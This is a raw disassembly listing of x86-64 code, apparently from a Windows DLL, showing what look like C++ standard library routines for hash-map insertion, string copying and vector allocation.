   180001dd4:	41 0f b6 40 02       	movzbl 0x2(%r8),%eax
   180001dd9:	4c 33 f8             	xor    %rax,%r15
   180001ddc:	4c 0f af f9          	imul   %rcx,%r15
   180001de0:	41 0f b6 40 03       	movzbl 0x3(%r8),%eax
   180001de5:	4c 33 f8             	xor    %rax,%r15
   180001de8:	4c 0f af f9          	imul   %rcx,%r15
   180001dec:	49 8b d7             	mov    %r15,%rdx
   180001def:	48 23 55 30          	and    0x30(%rbp),%rdx
   180001df3:	48 03 d2             	add    %rdx,%rdx
   180001df6:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   180001dfa:	48 8b 44 d1 08       	mov    0x8(%rcx,%rdx,8),%rax
   180001dff:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   180001e03:	49 8b 30             	mov    (%r8),%rsi
   180001e06:	48 3b c6             	cmp    %rsi,%rax
   180001e09:	74 31                	je     0x180001e3c
   180001e0b:	48 8b 14 d1          	mov    (%rcx,%rdx,8),%rdx
   180001e0f:	8b 0f                	mov    (%rdi),%ecx
   180001e11:	3b 48 10             	cmp    0x10(%rax),%ecx
   180001e14:	74 0e                	je     0x180001e24
   180001e16:	48 3b c2             	cmp    %rdx,%rax
   180001e19:	74 1e                	je     0x180001e39
   180001e1b:	48 8b 40 08          	mov    0x8(%rax),%rax
   180001e1f:	3b 48 10             	cmp    0x10(%rax),%ecx
   180001e22:	75 f2                	jne    0x180001e16
   180001e24:	48 8b 30             	mov    (%rax),%rsi
   180001e27:	48 85 c0             	test   %rax,%rax
   180001e2a:	74 10                	je     0x180001e3c
   180001e2c:	49 89 06             	mov    %rax,(%r14)
   180001e2f:	41 c6 46 08 00       	movb   $0x0,0x8(%r14)
   180001e34:	e9 b0 01 00 00       	jmp    0x180001fe9
   180001e39:	48 8b f0             	mov    %rax,%rsi
   180001e3c:	48 b8 aa aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaa,%rax
   180001e43:	aa aa 0a 
   180001e46:	48 39 45 10          	cmp    %rax,0x10(%rbp)
   180001e4a:	75 0e                	jne    0x180001e5a
   180001e4c:	48 8d 0d f5 35 00 00 	lea    0x35f5(%rip),%rcx        # 0x180005448
   180001e53:	ff 15 af 32 00 00    	call   *0x32af(%rip)        # 0x180005108
   180001e59:	cc                   	int3
   180001e5a:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   180001e5f:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   180001e66:	00 00 
   180001e68:	b9 18 00 00 00       	mov    $0x18,%ecx
   180001e6d:	e8 6e 15 00 00       	call   0x1800033e0
   180001e72:	48 8b d8             	mov    %rax,%rbx
   180001e75:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001e7a:	8b 0f                	mov    (%rdi),%ecx
   180001e7c:	89 48 10             	mov    %ecx,0x10(%rax)
   180001e7f:	f3 0f 10 5d 00       	movss  0x0(%rbp),%xmm3
   180001e84:	48 8b 7d 38          	mov    0x38(%rbp),%rdi
   180001e88:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   180001e8c:	48 83 c1 01          	add    $0x1,%rcx
   180001e90:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001e93:	78 07                	js     0x180001e9c
   180001e95:	f3 48 0f 2a c1       	cvtsi2ss %rcx,%xmm0
   180001e9a:	eb 15                	jmp    0x180001eb1
   180001e9c:	48 8b c1             	mov    %rcx,%rax
   180001e9f:	48 d1 e8             	shr    $1,%rax
   180001ea2:	83 e1 01             	and    $0x1,%ecx
   180001ea5:	48 0b c1             	or     %rcx,%rax
   180001ea8:	f3 48 0f 2a c0       	cvtsi2ss %rax,%xmm0
   180001ead:	f3 0f 58 c0          	addss  %xmm0,%xmm0
   180001eb1:	0f 57 d2             	xorps  %xmm2,%xmm2
   180001eb4:	48 85 ff             	test   %rdi,%rdi
   180001eb7:	78 07                	js     0x180001ec0
   180001eb9:	f3 48 0f 2a d7       	cvtsi2ss %rdi,%xmm2
   180001ebe:	eb 18                	jmp    0x180001ed8
   180001ec0:	48 8b cf             	mov    %rdi,%rcx
   180001ec3:	48 d1 e9             	shr    $1,%rcx
   180001ec6:	48 8b c7             	mov    %rdi,%rax
   180001ec9:	83 e0 01             	and    $0x1,%eax
   180001ecc:	48 0b c8             	or     %rax,%rcx
   180001ecf:	f3 48 0f 2a d1       	cvtsi2ss %rcx,%xmm2
   180001ed4:	f3 0f 58 d2          	addss  %xmm2,%xmm2
   180001ed8:	0f 28 c8             	movaps %xmm0,%xmm1
   180001edb:	f3 0f 5e ca          	divss  %xmm2,%xmm1
   180001edf:	0f 2f cb             	comiss %xmm3,%xmm1
   180001ee2:	0f 86 a9 00 00 00    	jbe    0x180001f91
   180001ee8:	f3 0f 5e c3          	divss  %xmm3,%xmm0
   180001eec:	e8 29 26 00 00       	call   0x18000451a
   180001ef1:	33 c9                	xor    %ecx,%ecx
   180001ef3:	f3 0f 10 0d 41 39 00 	movss  0x3941(%rip),%xmm1        # 0x18000583c
   180001efa:	00 
   180001efb:	0f 2f c1             	comiss %xmm1,%xmm0
   180001efe:	72 16                	jb     0x180001f16
   180001f00:	f3 0f 5c c1          	subss  %xmm1,%xmm0
   180001f04:	0f 2f c1             	comiss %xmm1,%xmm0
   180001f07:	73 0d                	jae    0x180001f16
   180001f09:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   180001f10:	00 00 80 
   180001f13:	48 8b c8             	mov    %rax,%rcx
   180001f16:	f3 48 0f 2c c0       	cvttss2si %xmm0,%rax
   180001f1b:	48 03 c1             	add    %rcx,%rax
   180001f1e:	b9 08 00 00 00       	mov    $0x8,%ecx
   180001f23:	48 3b c1             	cmp    %rcx,%rax
   180001f26:	48 0f 47 c8          	cmova  %rax,%rcx
   180001f2a:	48 3b f9             	cmp    %rcx,%rdi
   180001f2d:	73 1c                	jae    0x180001f4b
   180001f2f:	48 81 ff 00 02 00 00 	cmp    $0x200,%rdi
   180001f36:	73 10                	jae    0x180001f48
   180001f38:	48 8d 04 fd 00 00 00 	lea    0x0(,%rdi,8),%rax
   180001f3f:	00 
   180001f40:	48 8b f8             	mov    %rax,%rdi
   180001f43:	48 3b c1             	cmp    %rcx,%rax
   180001f46:	73 03                	jae    0x180001f4b
   180001f48:	48 8b f9             	mov    %rcx,%rdi
   180001f4b:	48 8b d7             	mov    %rdi,%rdx
   180001f4e:	48 8b cd             	mov    %rbp,%rcx
   180001f51:	e8 2a 05 00 00       	call   0x180002480
   180001f56:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   180001f5a:	49 23 cf             	and    %r15,%rcx
   180001f5d:	48 03 c9             	add    %rcx,%rcx
   180001f60:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   180001f64:	48 8b 44 ca 08       	mov    0x8(%rdx,%rcx,8),%rax
   180001f69:	48 8b 75 08          	mov    0x8(%rbp),%rsi
   180001f6d:	48 3b c6             	cmp    %rsi,%rax
   180001f70:	74 1f                	je     0x180001f91
   180001f72:	48 8b 14 ca          	mov    (%rdx,%rcx,8),%rdx
   180001f76:	8b 4b 10             	mov    0x10(%rbx),%ecx
   180001f79:	3b 48 10             	cmp    0x10(%rax),%ecx
   180001f7c:	74 10                	je     0x180001f8e
   180001f7e:	66 90                	xchg   %ax,%ax
   180001f80:	48 3b c2             	cmp    %rdx,%rax
   180001f83:	74 40                	je     0x180001fc5
   180001f85:	48 8b 40 08          	mov    0x8(%rax),%rax
   180001f89:	3b 48 10             	cmp    0x10(%rax),%ecx
   180001f8c:	75 f2                	jne    0x180001f80
   180001f8e:	48 8b 30             	mov    (%rax),%rsi
   180001f91:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   180001f95:	48 ff 45 10          	incq   0x10(%rbp)
   180001f99:	48 89 33             	mov    %rsi,(%rbx)
   180001f9c:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   180001fa0:	48 89 1a             	mov    %rbx,(%rdx)
   180001fa3:	48 89 5e 08          	mov    %rbx,0x8(%rsi)
   180001fa7:	48 8b 45 30          	mov    0x30(%rbp),%rax
   180001fab:	49 23 c7             	and    %r15,%rax
   180001fae:	48 03 c0             	add    %rax,%rax
   180001fb1:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   180001fb5:	4c 8b 04 c1          	mov    (%rcx,%rax,8),%r8
   180001fb9:	4c 3b 45 08          	cmp    0x8(%rbp),%r8
   180001fbd:	75 0b                	jne    0x180001fca
   180001fbf:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   180001fc3:	eb 17                	jmp    0x180001fdc
   180001fc5:	48 8b f0             	mov    %rax,%rsi
   180001fc8:	eb c7                	jmp    0x180001f91
   180001fca:	4c 3b c6             	cmp    %rsi,%r8
   180001fcd:	75 06                	jne    0x180001fd5
   180001fcf:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   180001fd3:	eb 0c                	jmp    0x180001fe1
   180001fd5:	48 39 54 c1 08       	cmp    %rdx,0x8(%rcx,%rax,8)
   180001fda:	75 05                	jne    0x180001fe1
   180001fdc:	48 89 5c c1 08       	mov    %rbx,0x8(%rcx,%rax,8)
   180001fe1:	49 89 1e             	mov    %rbx,(%r14)
   180001fe4:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   180001fe9:	49 8b c6             	mov    %r14,%rax
   180001fec:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180001ff1:	48 83 c4 30          	add    $0x30,%rsp
   180001ff5:	41 5f                	pop    %r15
   180001ff7:	41 5e                	pop    %r14
   180001ff9:	5f                   	pop    %rdi
   180001ffa:	5e                   	pop    %rsi
   180001ffb:	5d                   	pop    %rbp
   180001ffc:	c3                   	ret
   180001ffd:	cc                   	int3
   180001ffe:	cc                   	int3
   180001fff:	cc                   	int3
   180002000:	40 53                	rex push %rbx
   180002002:	48 83 ec 30          	sub    $0x30,%rsp
   180002006:	48 8b d9             	mov    %rcx,%rbx
   180002009:	48 8b 09             	mov    (%rcx),%rcx
   18000200c:	48 85 c9             	test   %rcx,%rcx
   18000200f:	74 4a                	je     0x18000205b
   180002011:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   180002015:	e8 06 02 00 00       	call   0x180002220
   18000201a:	48 8b 0b             	mov    (%rbx),%rcx
   18000201d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   180002021:	48 2b d1             	sub    %rcx,%rdx
   180002024:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   180002028:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000202f:	72 18                	jb     0x180002049
   180002031:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002035:	48 83 c2 27          	add    $0x27,%rdx
   180002039:	48 2b c8             	sub    %rax,%rcx
   18000203c:	48 83 e9 08          	sub    $0x8,%rcx
   180002040:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002044:	77 1b                	ja     0x180002061
   180002046:	48 8b c8             	mov    %rax,%rcx
   180002049:	e8 06 18 00 00       	call   0x180003854
   18000204e:	33 c0                	xor    %eax,%eax
   180002050:	48 89 03             	mov    %rax,(%rbx)
   180002053:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002057:	48 89 43 10          	mov    %rax,0x10(%rbx)
   18000205b:	48 83 c4 30          	add    $0x30,%rsp
   18000205f:	5b                   	pop    %rbx
   180002060:	c3                   	ret
   180002061:	33 c0                	xor    %eax,%eax
   180002063:	45 33 c9             	xor    %r9d,%r9d
   180002066:	45 33 c0             	xor    %r8d,%r8d
   180002069:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000206e:	33 d2                	xor    %edx,%edx
   180002070:	33 c9                	xor    %ecx,%ecx
   180002072:	ff 15 98 31 00 00    	call   *0x3198(%rip)        # 0x180005210
   180002078:	cc                   	int3
   180002079:	cc                   	int3
   18000207a:	cc                   	int3
   18000207b:	cc                   	int3
   18000207c:	cc                   	int3
   18000207d:	cc                   	int3
   18000207e:	cc                   	int3
   18000207f:	cc                   	int3
   180002080:	48 8b c4             	mov    %rsp,%rax
   180002083:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180002087:	48 89 68 18          	mov    %rbp,0x18(%rax)
   18000208b:	48 89 70 20          	mov    %rsi,0x20(%rax)
   18000208f:	57                   	push   %rdi
   180002090:	41 54                	push   %r12
   180002092:	41 55                	push   %r13
   180002094:	41 56                	push   %r14
   180002096:	41 57                	push   %r15
   180002098:	48 83 ec 50          	sub    $0x50,%rsp
   18000209c:	49 8b d8             	mov    %r8,%rbx
   18000209f:	4c 8b fa             	mov    %rdx,%r15
   1800020a2:	48 8b f1             	mov    %rcx,%rsi
   1800020a5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800020a8:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   1800020ac:	48 89 58 b8          	mov    %rbx,-0x48(%rax)
   1800020b0:	48 89 58 c0          	mov    %rbx,-0x40(%rax)
   1800020b4:	4c 89 48 c8          	mov    %r9,-0x38(%rax)
   1800020b8:	48 3b ca             	cmp    %rdx,%rcx
   1800020bb:	0f 84 08 01 00 00    	je     0x1800021c9
   1800020c1:	45 33 e4             	xor    %r12d,%r12d
   1800020c4:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1800020cb:	00 00 80 
   1800020ce:	b9 16 00 00 00       	mov    $0x16,%ecx
   1800020d3:	49 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r13
   1800020da:	ff ff 7f 
   1800020dd:	0f 1f 00             	nopl   (%rax)
   1800020e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800020e3:	0f 11 03             	movups %xmm0,(%rbx)
   1800020e6:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   1800020ea:	4c 89 63 18          	mov    %r12,0x18(%rbx)
   1800020ee:	4c 8b f6             	mov    %rsi,%r14
   1800020f1:	48 83 7e 18 0f       	cmpq   $0xf,0x18(%rsi)
   1800020f6:	76 03                	jbe    0x1800020fb
   1800020f8:	4c 8b 36             	mov    (%rsi),%r14
   1800020fb:	48 8b 6e 10          	mov    0x10(%rsi),%rbp
   1800020ff:	49 3b ed             	cmp    %r13,%rbp
   180002102:	0f 87 09 01 00 00    	ja     0x180002211
   180002108:	48 83 fd 0f          	cmp    $0xf,%rbp
   18000210c:	77 18                	ja     0x180002126
   18000210e:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   180002112:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180002119:	00 
   18000211a:	41 0f 10 06          	movups (%r14),%xmm0
   18000211e:	0f 11 03             	movups %xmm0,(%rbx)
   180002121:	e9 8d 00 00 00       	jmp    0x1800021b3
   180002126:	48 8b fd             	mov    %rbp,%rdi
   180002129:	48 83 cf 0f          	or     $0xf,%rdi
   18000212d:	49 3b fd             	cmp    %r13,%rdi
   180002130:	76 09                	jbe    0x18000213b
   180002132:	49 8b fd             	mov    %r13,%rdi
   180002135:	48 83 c0 27          	add    $0x27,%rax
   180002139:	eb 2c                	jmp    0x180002167
   18000213b:	48 83 ff 16          	cmp    $0x16,%rdi
   18000213f:	48 0f 42 f9          	cmovb  %rcx,%rdi
   180002143:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   180002147:	48 85 c9             	test   %rcx,%rcx
   18000214a:	75 05                	jne    0x180002151
   18000214c:	49 8b c4             	mov    %r12,%rax
   18000214f:	eb 39                	jmp    0x18000218a
   180002151:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   180002158:	72 2b                	jb     0x180002185
   18000215a:	48 8d 41 27          	lea    0x27(%rcx),%rax
   18000215e:	48 3b c1             	cmp    %rcx,%rax
   180002161:	0f 86 a4 00 00 00    	jbe    0x18000220b
   180002167:	48 8b c8             	mov    %rax,%rcx
   18000216a:	e8 71 12 00 00       	call   0x1800033e0
   18000216f:	48 8b c8             	mov    %rax,%rcx
   180002172:	48 85 c0             	test   %rax,%rax
   180002175:	74 7e                	je     0x1800021f5
   180002177:	48 83 c0 27          	add    $0x27,%rax
   18000217b:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   18000217f:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   180002183:	eb 05                	jmp    0x18000218a
   180002185:	e8 56 12 00 00       	call   0x1800033e0
   18000218a:	48 89 03             	mov    %rax,(%rbx)
   18000218d:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   180002191:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   180002195:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   180002199:	49 8b d6             	mov    %r14,%rdx
   18000219c:	48 8b c8             	mov    %rax,%rcx
   18000219f:	e8 6a 23 00 00       	call   0x18000450e
   1800021a4:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1800021ab:	00 00 80 
   1800021ae:	b9 16 00 00 00       	mov    $0x16,%ecx
   1800021b3:	48 83 c3 20          	add    $0x20,%rbx
   1800021b7:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800021bc:	48 83 c6 20          	add    $0x20,%rsi
   1800021c0:	49 3b f7             	cmp    %r15,%rsi
   1800021c3:	0f 85 17 ff ff ff    	jne    0x1800020e0
   1800021c9:	48 8b d3             	mov    %rbx,%rdx
   1800021cc:	48 8b cb             	mov    %rbx,%rcx
   1800021cf:	e8 4c 00 00 00       	call   0x180002220
   1800021d4:	48 8b c3             	mov    %rbx,%rax
   1800021d7:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1800021dc:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1800021e0:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   1800021e4:	49 8b 73 48          	mov    0x48(%r11),%rsi
   1800021e8:	49 8b e3             	mov    %r11,%rsp
   1800021eb:	41 5f                	pop    %r15
   1800021ed:	41 5e                	pop    %r14
   1800021ef:	41 5d                	pop    %r13
   1800021f1:	41 5c                	pop    %r12
   1800021f3:	5f                   	pop    %rdi
   1800021f4:	c3                   	ret
   1800021f5:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1800021fa:	45 33 c9             	xor    %r9d,%r9d
   1800021fd:	45 33 c0             	xor    %r8d,%r8d
   180002200:	33 d2                	xor    %edx,%edx
   180002202:	33 c9                	xor    %ecx,%ecx
   180002204:	ff 15 06 30 00 00    	call   *0x3006(%rip)        # 0x180005210
   18000220a:	cc                   	int3
   18000220b:	e8 60 f0 ff ff       	call   0x180001270
   180002210:	cc                   	int3
   180002211:	e8 fa f0 ff ff       	call   0x180001310
   180002216:	cc                   	int3
   180002217:	cc                   	int3
   180002218:	cc                   	int3
   180002219:	cc                   	int3
   18000221a:	cc                   	int3
   18000221b:	cc                   	int3
   18000221c:	cc                   	int3
   18000221d:	cc                   	int3
   18000221e:	cc                   	int3
   18000221f:	cc                   	int3
   180002220:	48 3b ca             	cmp    %rdx,%rcx
   180002223:	74 78                	je     0x18000229d
   180002225:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000222a:	57                   	push   %rdi
   18000222b:	48 83 ec 30          	sub    $0x30,%rsp
   18000222f:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   180002234:	48 8b fa             	mov    %rdx,%rdi
   180002237:	33 f6                	xor    %esi,%esi
   180002239:	48 8b d9             	mov    %rcx,%rbx
   18000223c:	0f 1f 40 00          	nopl   0x0(%rax)
   180002240:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180002244:	48 83 fa 0f          	cmp    $0xf,%rdx
   180002248:	76 2c                	jbe    0x180002276
   18000224a:	48 8b 0b             	mov    (%rbx),%rcx
   18000224d:	48 ff c2             	inc    %rdx
   180002250:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002257:	72 18                	jb     0x180002271
   180002259:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   18000225d:	48 83 c2 27          	add    $0x27,%rdx
   180002261:	48 2b c8             	sub    %rax,%rcx
   180002264:	48 83 e9 08          	sub    $0x8,%rcx
   180002268:	48 83 f9 1f          	cmp    $0x1f,%rcx
   18000226c:	77 30                	ja     0x18000229e
   18000226e:	48 8b c8             	mov    %rax,%rcx
   180002271:	e8 de 15 00 00       	call   0x180003854
   180002276:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   18000227a:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180002281:	00 
   180002282:	40 88 33             	mov    %sil,(%rbx)
   180002285:	48 83 c3 20          	add    $0x20,%rbx
   180002289:	48 3b df             	cmp    %rdi,%rbx
   18000228c:	75 b2                	jne    0x180002240
   18000228e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180002293:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180002298:	48 83 c4 30          	add    $0x30,%rsp
   18000229c:	5f                   	pop    %rdi
   18000229d:	c3                   	ret
   18000229e:	45 33 c9             	xor    %r9d,%r9d
   1800022a1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800022a6:	45 33 c0             	xor    %r8d,%r8d
   1800022a9:	33 d2                	xor    %edx,%edx
   1800022ab:	33 c9                	xor    %ecx,%ecx
   1800022ad:	ff 15 5d 2f 00 00    	call   *0x2f5d(%rip)        # 0x180005210
   1800022b3:	cc                   	int3
   1800022b4:	cc                   	int3
   1800022b5:	cc                   	int3
   1800022b6:	cc                   	int3
   1800022b7:	cc                   	int3
   1800022b8:	cc                   	int3
   1800022b9:	cc                   	int3
   1800022ba:	cc                   	int3
   1800022bb:	cc                   	int3
   1800022bc:	cc                   	int3
   1800022bd:	cc                   	int3
   1800022be:	cc                   	int3
   1800022bf:	cc                   	int3
   1800022c0:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1800022c4:	48 85 c9             	test   %rcx,%rcx
   1800022c7:	74 0a                	je     0x1800022d3
   1800022c9:	ba 18 00 00 00       	mov    $0x18,%edx
   1800022ce:	e9 81 15 00 00       	jmp    0x180003854
   1800022d3:	c3                   	ret
   1800022d4:	cc                   	int3
   1800022d5:	cc                   	int3
   1800022d6:	cc                   	int3
   1800022d7:	cc                   	int3
   1800022d8:	cc                   	int3
   1800022d9:	cc                   	int3
   1800022da:	cc                   	int3
   1800022db:	cc                   	int3
   1800022dc:	cc                   	int3
   1800022dd:	cc                   	int3
   1800022de:	cc                   	int3
   1800022df:	cc                   	int3
   1800022e0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800022e5:	55                   	push   %rbp
   1800022e6:	57                   	push   %rdi
   1800022e7:	41 56                	push   %r14
   1800022e9:	48 83 ec 30          	sub    $0x30,%rsp
   1800022ed:	48 8b 39             	mov    (%rcx),%rdi
   1800022f0:	4c 8b f1             	mov    %rcx,%r14
   1800022f3:	49 8b d8             	mov    %r8,%rbx
   1800022f6:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   1800022fa:	49 8b c8             	mov    %r8,%rcx
   1800022fd:	48 2b cf             	sub    %rdi,%rcx
   180002300:	48 8b c1             	mov    %rcx,%rax
   180002303:	48 c1 f8 03          	sar    $0x3,%rax
   180002307:	48 3b c2             	cmp    %rdx,%rax
   18000230a:	0f 83 f5 00 00 00    	jae    0x180002405
   180002310:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   180002317:	ff ff 1f 
   18000231a:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   18000231f:	48 3b d0             	cmp    %rax,%rdx
   180002322:	0f 87 07 01 00 00    	ja     0x18000242f
   180002328:	48 8d 34 d5 00 00 00 	lea    0x0(,%rdx,8),%rsi
   18000232f:	00 
   180002330:	33 ed                	xor    %ebp,%ebp
   180002332:	48 85 f6             	test   %rsi,%rsi
   180002335:	75 04                	jne    0x18000233b
   180002337:	8b fd                	mov    %ebp,%edi
   180002339:	eb 3d                	jmp    0x180002378
   18000233b:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   180002342:	72 29                	jb     0x18000236d
   180002344:	48 8d 4e 27          	lea    0x27(%rsi),%rcx
   180002348:	48 3b ce             	cmp    %rsi,%rcx
   18000234b:	0f 86 de 00 00 00    	jbe    0x18000242f
   180002351:	e8 8a 10 00 00       	call   0x1800033e0
   180002356:	48 85 c0             	test   %rax,%rax
   180002359:	0f 84 90 00 00 00    	je     0x1800023ef
   18000235f:	48 8d 78 27          	lea    0x27(%rax),%rdi
   180002363:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   180002367:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   18000236b:	eb 0b                	jmp    0x180002378
   18000236d:	48 8b ce             	mov    %rsi,%rcx
   180002370:	e8 6b 10 00 00       	call   0x1800033e0
   180002375:	48 8b f8             	mov    %rax,%rdi
   180002378:	49 8b 0e             	mov    (%r14),%rcx
   18000237b:	49 8b 46 10          	mov    0x10(%r14),%rax
   18000237f:	48 2b c1             	sub    %rcx,%rax
   180002382:	48 c1 f8 03          	sar    $0x3,%rax
   180002386:	48 85 c0             	test   %rax,%rax
   180002389:	74 2e                	je     0x1800023b9
   18000238b:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   180002392:	00 
   180002393:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000239a:	72 18                	jb     0x1800023b4
   18000239c:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800023a0:	48 83 c2 27          	add    $0x27,%rdx
   1800023a4:	48 2b c8             	sub    %rax,%rcx
   1800023a7:	48 83 e9 08          	sub    $0x8,%rcx
   1800023ab:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1800023af:	77 3e                	ja     0x1800023ef
   1800023b1:	48 8b c8             	mov    %rax,%rcx
   1800023b4:	e8 9b 14 00 00       	call   0x180003854
   1800023b9:	48 8d 04 3e          	lea    (%rsi,%rdi,1),%rax
   1800023bd:	49 89 3e             	mov    %rdi,(%r14)
   1800023c0:	49 89 46 08          	mov    %rax,0x8(%r14)
   1800023c4:	49 89 46 10          	mov    %rax,0x10(%r14)
   1800023c8:	48 3b f8             	cmp    %rax,%rdi
   1800023cb:	74 0f                	je     0x1800023dc
   1800023cd:	0f 1f 00             	nopl   (%rax)
   1800023d0:	48 89 1f             	mov    %rbx,(%rdi)
   1800023d3:	48 83 c7 08          	add    $0x8,%rdi
   1800023d7:	48 3b f8             	cmp    %rax,%rdi
   1800023da:	75 f4                	jne    0x1800023d0
   1800023dc:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1800023e1:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1800023e6:	48 83 c4 30          	add    $0x30,%rsp
   1800023ea:	41 5e                	pop    %r14
   1800023ec:	5f                   	pop    %rdi
   1800023ed:	5d                   	pop    %rbp
   1800023ee:	c3                   	ret
   1800023ef:	45 33 c9             	xor    %r9d,%r9d
   1800023f2:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1800023f7:	45 33 c0             	xor    %r8d,%r8d
   1800023fa:	33 d2                	xor    %edx,%edx
   1800023fc:	33 c9                	xor    %ecx,%ecx
   1800023fe:	ff 15 0c 2e 00 00    	call   *0x2e0c(%rip)        # 0x180005210
   180002404:	cc                   	int3
   180002405:	48 83 c1 07          	add    $0x7,%rcx
   180002409:	33 ed                	xor    %ebp,%ebp
   18000240b:	48 c1 e9 03          	shr    $0x3,%rcx
   18000240f:	49 3b f8             	cmp    %r8,%rdi
   180002412:	48 0f 47 cd          	cmova  %rbp,%rcx
   180002416:	48 85 c9             	test   %rcx,%rcx
   180002419:	74 c6                	je     0x1800023e1
   18000241b:	48 8b c3             	mov    %rbx,%rax
   18000241e:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180002423:	f3 48 ab             	rep stos %rax,(%rdi)
   180002426:	48 83 c4 30          	add    $0x30,%rsp
   18000242a:	41 5e                	pop    %r14
   18000242c:	5f                   	pop    %rdi
   18000242d:	5d                   	pop    %rbp
   18000242e:	c3                   	ret
   18000242f:	e8 3c ee ff ff       	call   0x180001270
   180002434:	cc                   	int3
   180002435:	cc                   	int3
   180002436:	cc                   	int3
   180002437:	cc                   	int3
   180002438:	cc                   	int3
   180002439:	cc                   	int3
   18000243a:	cc                   	int3
   18000243b:	cc                   	int3
   18000243c:	cc                   	int3
   18000243d:	cc                   	int3
   18000243e:	cc                   	int3
   18000243f:	cc                   	int3
   180002440:	48 8b 09             	mov    (%rcx),%rcx
   180002443:	48 85 c9             	test   %rcx,%rcx
   180002446:	0f 85 b4 fb ff ff    	jne    0x180002000
   18000244c:	c3                   	ret
   18000244d:	cc                   	int3
   18000244e:	cc                   	int3
   18000244f:	cc                   	int3
   180002450:	48 83 ec 28          	sub    $0x28,%rsp
   180002454:	48 8d 0d 0d 30 00 00 	lea    0x300d(%rip),%rcx        # 0x180005468
   18000245b:	ff 15 a7 2c 00 00    	call   *0x2ca7(%rip)        # 0x180005108
   180002461:	cc                   	int3
   180002462:	cc                   	int3
   180002463:	cc                   	int3
   180002464:	cc                   	int3
   180002465:	cc                   	int3
   180002466:	cc                   	int3
   180002467:	cc                   	int3
   180002468:	cc                   	int3
   180002469:	cc                   	int3
   18000246a:	cc                   	int3
   18000246b:	cc                   	int3
   18000246c:	cc                   	int3
   18000246d:	cc                   	int3
   18000246e:	cc                   	int3
   18000246f:	cc                   	int3
   180002470:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180002474:	48 8b 09             	mov    (%rcx),%rcx
   180002477:	e9 a4 fd ff ff       	jmp    0x180002220
   18000247c:	cc                   	int3
   18000247d:	cc                   	int3
   18000247e:	cc                   	int3
   18000247f:	cc                   	int3
   180002480:	40 53                	rex push %rbx
   180002482:	56                   	push   %rsi
   180002483:	48 83 ec 28          	sub    $0x28,%rsp
